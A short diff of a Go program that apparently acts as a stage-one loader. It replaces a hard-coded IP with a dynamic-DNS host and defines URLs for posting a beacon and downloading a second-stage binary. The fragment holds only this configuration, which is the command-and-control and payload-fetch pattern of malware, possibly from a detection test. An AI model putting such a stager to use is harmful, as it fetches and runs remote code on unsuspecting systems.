@@ -88,10 +88,10 @@ func get_ips() ([]string, error) {
 func main() {
 
 	// define constants and variables
-	const ip = "54.184.116.123"
+	const host = "lacework.ddns.net"
 	var filename = "lw-stage-2"
-	var post_url = "http://"+ip+"/lw-beacon"
-	var get_url = "http://"+ip+"/bin/"+filename
+	var post_url = "http://"+host+"/lw-beacon"
+	var get_url = "http://"+host+"/bin/"+filename
 	var body = []byte(`{"stage":"1"}`)
 
 	// wait a few seconds
